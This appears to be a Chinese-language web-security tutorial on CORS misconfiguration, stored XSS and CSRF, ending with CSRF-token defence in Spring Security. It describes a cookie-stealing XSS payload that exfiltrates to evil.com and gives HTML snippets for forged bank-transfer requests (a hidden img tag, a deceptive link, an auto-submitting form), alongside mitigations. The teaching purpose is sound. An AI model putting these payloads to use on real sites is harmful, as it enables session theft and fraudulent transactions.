...
>参考链接：https://en.wikipedia.org/wiki/Same-origin_policy
...
核心的攻击方式是 **跨站请求伪造（CSRF）** 和各类 **跨域信息泄露**。

---

#### 核心概念回顾：CORS 的作用

CORS 机制的核心是：**一个域的网站默认不能通过前端代码（如 JavaScript）读取另一个域的资源的响应内容。** 这是浏览器的“同源策略”规定的。

CORS 通过一系列 HTTP 头（如 `Access-Control-Allow-Origin`）来**有控制地放松**这个限制。配置不当，就等于放松过度，打开了安全大门。

---

#### 主要的配置错误及被利用方式

以下是几种常见的错误配置及其对应的攻击场景：

##### 1. 错误地将 `Access-Control-Allow-Origin` 设置为 `"*"`（通配符）

*   **错误配置**：
    ```http
    Access-Control-Allow-Origin: *
    ```
    这意味着任何网站都可以通过前端 JavaScript 读取本服务器的响应。

*   **如何被利用**：
    1.  攻击者搭建一个恶意网站 `http://evil.com`。
    2.  该网站使用 JavaScript 向你的敏感 API（如 `https://api.your-bank.com/user/account`）发送请求。因为用户浏览器可能已保存了你的银行网站的登录凭证（Cookie），这个请求会自动带上这些凭证。
    3.  由于你的服务器响应了 `Access-Control-Allow-Origin: *`，恶意网站的 JavaScript **能够完整地读取到 API 返回的敏感数据**（如账户余额、个人信息）。
    4.  恶意网站将这些数据发送到攻击者控制的服务器，完成数据窃取。

*   **安全建议**：`Access-Control-Allow-Origin` 应该明确设置为**且仅设置为**需要访问资源的、受信任的源（Origin），例如 `https://www.trusted-app.com`。**绝对不要**对包含认证信息或敏感数据的接口使用通配符。

##### 2. 过于宽松的 `Access-Control-Allow-Credentials` 配置
...
*   **错误配置**：同时设置以下两项：
    ...
    ```
    这表示允许 `https://attacker.com` 在跨域请求中携带 Cookie、HTTP认证等凭证，并且可以读取响应。

*   **如何被利用**：
    1.  攻击者控制着 `https://attacker.com`。
    2.  他诱使用户访问该网站。
    3.  网站上的脚本向你的应用 `https://yourapp.com/api/private-data` 发送请求，该请求会带上用户在你网站上的登录 Cookie。
    4.  你的服务器不仅处理了请求，还因为配置错误，允许 `attacker.com` 读取响应。攻击者从而窃取了私有数据。

*   **安全建议**：
    *   **绝对不能**将 `Access-Control-Allow-Origin` 设置为通配符 `*` 的同时，将 `Access-Control-Allow-Credentials` 设置为 `true`。浏览器会禁止这种配置。
    *   如果需要凭证，`Access-Control-Allow-Origin` 必须是一个明确的、可信的源。

##### 3. 对 `Origin` 头校验不严（反射或任意 Origin）

*   **错误配置**：服务器简单地读取请求中的 `Origin` 头，然后不加校验地将其设置为 `Access-Control-Allow-Origin` 头的值。
    *   **请求：**
        ```http
    ...
    *   **响应：**
        ...
        Access-Control-Allow-Credentials: true
        ```
        服务器无条件地信任客户端发来的 `Origin`。

*   **如何被利用**：
    1.  攻击者可以构造一个来自任意源（如 `https://evil.com`）的请求。
    2.  服务器会反射回这个源，并允许携带凭证。
    3.  这实际上等于为**所有网站**都开启了跨域访问权限，因为攻击者可以指定任何 `Origin`。其危害性与设置为 `*` 类似。

*   **安全建议**：服务器必须有一个**白名单**机制。只有当请求的 `Origin` 头存在于白名单中时，才将其值设置为 `Access-Control-Allow-Origin` 的响应头。否则，应返回一个错误的 `Origin` 或不返回该 CORS 头。

##### 4. 预检请求（Preflight Request）配置不当

对于“非简单请求”（例如使用 `Content-Type: application/json` 的 POST 请求），浏览器会先发送一个 `OPTIONS` 方法的“预检请求”来询问服务器是否允许接下来的实际请求。

*   **错误配置**：
    *   **过度宽松的 `Access-Control-Allow-Methods`**： 设置为 `*` 或 `GET, POST, PUT, DELETE, PATCH, ...`，即允许所有方法。攻击者可能利用此来发起本应被禁止的请求（如危险的 `PUT` 或 `DELETE` 操作）。
    *   **过度宽松的 `Access-Control-Allow-Headers`**： 设置为 `*` 或包含过多不必要的请求头。攻击者可能利用此来注入自定义头，触发应用程序的某些非预期行为。

*   **如何被利用**：结合 CSRF 攻击。虽然预检机制本身增加了 CSRF 的难度（因为简单请求如 GET/POST 表单不会触发预检），但如果服务器对预检请求的校验不严，攻击者仍有可能构造出复杂的恶意请求。

*   **安全建议**：严格限制 `Access-Control-Allow-Methods` 和 `Access-Control-Allow-Headers`，只开放应用程序实际需要的方法和头。
...
1.  **发现漏洞**：攻击者扫描或手动测试发现你的网站存在 CORS 错误配置（如反射 Origin 或使用通配符）。
2.  **设置陷阱**：攻击者创建一个看起来无害的恶意网站。
3.  **诱导访问**：通过钓鱼邮件、社交媒体链接等方式，诱骗已在你网站登录的用户访问恶意网站。
4.  **发起攻击**：恶意网站的 JavaScript 自动向你的网站发起跨域请求（浏览器会自动带上用户的 Cookie）。
5.  **绕过同源策略**：由于你的 CORS 配置错误，浏览器允许恶意网站读取你网站 API 返回的**完整响应**。
6.  **窃取数据**：恶意网站的 JavaScript 将窃取到的数据（会话ID、个人信息、财务数据等）发送到攻击者控制的服务器。

#### 安全配置最佳实践

1.  **严格校验 Origin**：使用白名单机制，只允许受信任的源。
2.  **避免使用通配符 `*`**：特别是当请求需要凭证（Cookie、Authorization 头）时。
3.  **最小权限原则**：严格设置 `Access-Control-Allow-Methods` 和 `Access-Control-Allow-Headers`，只开放必要的方法和头。
4.  **避免反射 Origin**：不要简单地将请求中的 `Origin` 头值直接反射为响应头。
5.  **内部网络服务也要配置**：即使是内部 API，如果可能被用户浏览器访问到，也必须正确配置 CORS，防止内部攻击。

简而言之，CORS 配置不当的本质是**错误地信任了来自不可信域的请求**，导致同源策略的保护失效，从而引发严重的数据泄露风险。
...
XSS（Cross-Site Scripting，跨站脚本攻击）的核心原理可以概括为一句话：

**攻击者将恶意的脚本代码注入到可信的网站中，当用户的浏览器访问这个被“污染”的页面时，浏览器会执行这段恶意脚本，从而窃取用户数据、冒充用户进行非法操作等。**

关键在于“跨站”：恶意脚本并非来自网站本身的服务器，而是通过用户提交的内容（如评论、留言等）“混”进了正常的页面，并被浏览器误认为是可信的合法内容而执行。

---

#### 二、一个经典的攻击过程解析：窃取用户Cookie

我们以一个简单的博客网站留言板为例。

**角色：**
*   **网站（vulnerable-blog.com）**：一个存在XSS漏洞的网站。它有一个留言板功能，用户提交留言后，留言会直接显示在页面上。
*   **受害者（小王）**：该博客网站的注册用户，已经登录，浏览器中保存了他的登录凭证（Session Cookie）。
*   **攻击者（小黑）**：意图窃取小王Cookie的恶意用户。
...
1.  小黑访问这个博客的留言板。
2.  他尝试在留言框里输入一些简单的HTML代码，比如 `<h1>测试一下</h1>`，然后提交。
3.  提交后，他刷新页面，发现自己的留言“**测试一下**”竟然以巨大的标题格式显示出来了！
4.  这说明网站程序没有对用户输入进行严格的过滤，而是直接将输入的内容作为HTML代码的一部分渲染到了页面上。这就是一个**存储型XSS漏洞**。

**第二步：构造恶意载荷**

小黑不满足于只是改变字体，他的目标是窃取小王的Cookie。他知道，有了小王的Cookie，他就能在小王的浏览器上直接登录小王的账户。

于是，他构造了一条特殊的留言，这条留言包含了一段JavaScript代码：
...
```
*   **`<script>`**：HTML标签，告诉浏览器其中的内容是脚本。
*   **`document.cookie`**：JavaScript代码，能获取当前用户（在这个例子中就是小王）在该网站下的Cookie。
*   **`img.src`**：创建一个图片对象，并将其源地址指向攻击者自己的服务器（`evil.com`），并将小王的Cookie作为参数附加在URL后面。

**第三步：投放攻击**

小黑将上面这段代码作为留言内容提交到博客网站。网站服务器收到后，将其作为一条普通的留言存储到数据库中。现在，这个留言板页面已经被“污染”了。

**第四步：触发攻击（受害者登场）**

1.  小王（受害者）像往常一样登录了博客网站，他的浏览器因此保存了他的登录Cookie。
2.  小王来到留言板页面，想看看大家的留言。
3.  当小王的浏览器加载这个页面时，它会从数据库加载所有留言，包括小黑提交的那条“特殊”留言。
4.  浏览器看到 `<script>` 标签，认为这是网站提供的合法脚本，于是**毫不犹豫地执行了它**。

**第五步：攻击完成，数据窃取**

1.  在小王毫不知情的情况下，他的浏览器执行了那段恶意脚本。
2.  脚本执行 `document.cookie`，成功获取了小王的登录Cookie。
3.  然后，脚本试图加载一个来自 `http://evil.com/steal?cookie=小王的Cookie内容` 的图片。
5.  小王的浏览器会向 `evil.com` 发起一个HTTP请求。虽然这可能是一个无效的图片，但对小黑来说，这根本不重要。
6.  重要的是，小黑的服务器（`evil.com`）的访问日志会完整地记录下这个请求，包括URL中 `?cookie=` 后面的全部内容。

**第六步：攻击者利用赃物**

小黑查看自己服务器（`evil.com`）的日志，找到了包含小王Cookie的请求记录。他复制这段Cookie，然后在自己的浏览器上使用开发者工具，手动将Cookie修改为小王的Cookie。刷新页面后，网站就会认为小黑就是小王，从而成功冒充小王登录了账户。
...
> 一个坏蛋（攻击者）伪造了一封盖着银行公章的公文（恶意脚本），然后混进了银行布告栏（可信网站）的合法文件中。当一位客户（受害者）来银行办理业务时，他阅读了布告栏上的这封假公文，并按照上面的指示把自己的银行卡和密码交给了旁边的“假工作人员”（攻击者的服务器）。客户以为自己是在遵循银行的合法流程，但实际上信息已经泄露。

##### XSS的主要类型

1.  **反射型XSS**：恶意脚本作为请求（比如一个精心构造的链接）的一部分发送给服务器，服务器直接“反射”回响应页面中执行。通常需要诱骗用户点击那个恶意链接。
2.  **存储型XSS**（本例中的类型）：恶意脚本被永久地存储在目标服务器上（如数据库、留言板、用户资料等），每当有用户访问包含该恶意脚本的页面时，攻击就会发生。危害最大。
3.  **DOM型XSS**：漏洞出在客户端的JavaScript代码逻辑上，前端脚本不安全地操作了DOM（页面结构），将用户输入写入了页面，导致了攻击。

##### 如何防御？

*   **对用户输入进行转义**：将用户输入中的 `<`, `>` 等特殊字符转换成HTML实体（如 `&lt;`, `&gt;`），这样浏览器就不会将其解释为代码。
*   **使用CSP（内容安全策略）**：告诉浏览器只允许执行来自特定来源的脚本，从根本上杜绝内联脚本（如本例中的`<script>`）的执行。
*   **对敏感Cookie设置 `HttpOnly` 属性**：这样JavaScript代码（`document.cookie`）就无法读取到这些Cookie，即使发生XSS攻击，攻击者也无法窃取。
...
4. 网站B返回一些攻击性代码，并发出一个请求要求访问受信任网站A。
...
### CSRF Token机制防御CSRF攻击原理

#### 第一部分：CSRF 攻击是如何发生的？

我们先模拟一个没有 CSRF Token 保护的危险场景。

**场景设定：**
1.  **受害者：** 小明，已登录他的网上银行 `www.example-bank.com`。
2.  **银行操作：** 银行有一个转账功能，通过 GET 请求执行（这里用 GET 请求是为了简化说明，即使使用 POST 请求，如果没有防护，同样危险）。
3.  **转账请求：** `https://www.example-bank.com/transfer?to=黑客的账户&amount=1000`
    小明登录后，浏览器会保存银行的 Session Cookie。当他访问这个链接时，浏览器会自动带上这个 Cookie，银行服务器验证 Cookie 有效后，就会执行转账。
4.  **攻击者：** 黑客，他精心构造了一个恶意网站。

**攻击过程：**

1.  **诱导点击：** 黑客通过邮件、论坛等方式，发送一个链接给小明，比如：“快来看这个有趣的猫咪视频！”
2.  **链接内容：** 这个链接实际上指向黑客的恶意网站，但页面上隐藏着这样一段代码：
    ```html
    <img src="https://www.example-bank.com/transfer?to=黑客的账户&amount=1000" width="0" height="0" />
    ```
    或者是一个更具欺骗性的按钮：
    ```html
    <a href="https://www.example-bank.com/transfer?to=黑客的账户&amount=1000">
        点击领取红包！ <!-- 诱人的文字 -->
    </a>
    ```
3.  **小明上钩：** 小明点击了这个链接。他的浏览器会加载这个恶意网页。
4.  **自动发起请求：** 浏览器解析页面时，会尝试加载那个 `img` 标签的“图片”，或者小明点击了那个“领取红包”的链接。这会导致浏览器向 `www.example-bank.com` 发起一个 **GET** 请求。
5.  **携带 Cookie：** 关键一步！因为小明已经登录了网银，他的浏览器里存有网银的 Session Cookie。根据浏览器的同源策略，**在向 `example-bank.com` 发请求时，浏览器会自动带上这个域名下的 Cookie**。
6.  **银行处理请求：** 请求到达银行服务器。服务器看到这个请求带着有效的 Session Cookie（小明的登录凭证），便认为“这是小明本人发起的合法转账请求”。
7.  **攻击成功：** 于是，银行服务器执行了转账操作，将小明的 1000 元转到了黑客的账户。而小明对此毫不知情。

**核心问题：** 浏览器发起的每一个指向 `example-bank.com` 的请求，都会自动携带该站点的 Cookie。服务器无法区分这个请求是“小明自愿在银行页面上点击的”还是“在黑客的页面上被诱骗点击的”。

---

#### 第二部分：CSRF Token 如何力挽狂澜？

现在，我们为银行的转账功能加上 CSRF Token 防护。

**防护机制设定：**

1.  **生成 Token：** 当小明登录网银后，服务器在给他返回的转账页面（一个表单）时，会生成一个**随机、唯一、不可预测**的字符串，这就是 CSRF Token。例如：`x9Yq9Lp2ZfEa1sR7t`。这个 Token 会：
    *   **放在表单的隐藏域中：**
        ```html
        <form action="/transfer" method="POST">
            <input type="hidden" name="csrf_token" value="x9Yq9Lp2ZfEa1sR7t" />
            收款账户: <input type="text" name="to"/><br/>
            金额: <input type="text" name="amount"/><br/>
            <input type="submit" value="转账"/>
        </form>
        ```
    *   **同时，服务器将这个 Token 与小明的 Session 关联保存**（比如保存在服务器端的 Session 数据里，或加密后放入 Cookie）。

2.  **验证 Token：** 服务器要求，所有改变状态的敏感操作（如转账），请求中必须包含这个 Token。当小明提交转账表单时，请求会长这样：
    ```
    POST /transfer HTTP/1.1
    Host: www.example-bank.com
    Cookie: session_id=小明的session cookie... （浏览器自动携带）
    
    to=黑客的账户&amount=1000&csrf_token=x9Yq9Lp2ZfEa1sR7t （表单数据）
    ```
    服务器收到请求后，会执行两步验证：
    *   **第一步（验证身份）：** 从 Cookie 中取出 Session ID，确认是小明本人已登录。
    *   **第二步（验证意图）：** 从请求体（POST 参数）中取出 `csrf_token` 的值，与服务器端存储的、对应小明 Session 的 Token 进行比对。

**再看攻击过程：**

1.  黑客依然构造恶意页面，但他现在**无法知道**小明当前的 CSRF Token 是什么。因为这个 Token 是随机且与 Session 绑定的，黑客无法通过恶意网站上的代码读取到它（得益于浏览器的同源策略）。
2.  黑客的恶意页面只能发起一个不包含正确 Token 的请求。比如，他构造的表单里 `csrf_token` 的值只能是瞎猜的 `123456`。
    ```html
    <form id="badForm" action="https://www.example-bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="黑客的账户" />
        <input type="hidden" name="amount" value="1000" />
        <input type="hidden" name="csrf_token" value="123456" /> <!-- 错误的 Token -->
    </form>
    <script>document.getElementById('badForm').submit();</script>
    ```
3.  小明访问恶意页面，浏览器自动提交表单，请求发出。Cookie 依然被自动带上。
4.  请求到达银行服务器。服务器进行验证：
    *   **第一步（验证身份）：** 通过 Cookie 中的 Session ID，确认是小明。✅
    *   **第二步（验证意图）：** 比对请求中的 `csrf_token=123456` 和服务器为小明 Session 保存的正确 Token `x9Yq9Lp2ZfEa1sR7t`。❌ **不匹配！**
5.  **防护生效：** 服务器识别出这是一个非法请求，**拒绝执行转账操作**，并可能记录此次攻击尝试或让小明重新登录。

#### 总结

CSRF Token 之所以能有效防御 CSRF 攻击，是因为它引入了一个**攻击者无法预测、且无法在伪造请求中携带的“凭证”**。

*   **攻击的本质**：利用浏览器自动携带 Cookie 的机制冒用身份。
*   **Token 的防御原理**：在 Cookie 之外，增加一个攻击者“猜不到”、“拿不到”的额外凭证（Token）。这个 Token 不会像 Cookie 那样被浏览器自动发送，它必须由合法的前端应用代码（如银行的转账页面）主动放在请求中（如表单数据、HTTP 头）。
*   **结果**：服务器通过验证这个额外的凭证，可以准确区分“用户自愿发起的合法请求”和“攻击者伪造的恶意请求”，从而彻底杜绝了 CSRF 攻击。

### Spring Security 启用 csrf 防御

>说明：通过 csrf token 机制防御 csrf 攻击。
>
>详细用法请参考本站[示例](https://gitee.com/dexterleslie/demonstration/tree/master/demo-computer-information-security/demo-csrf)
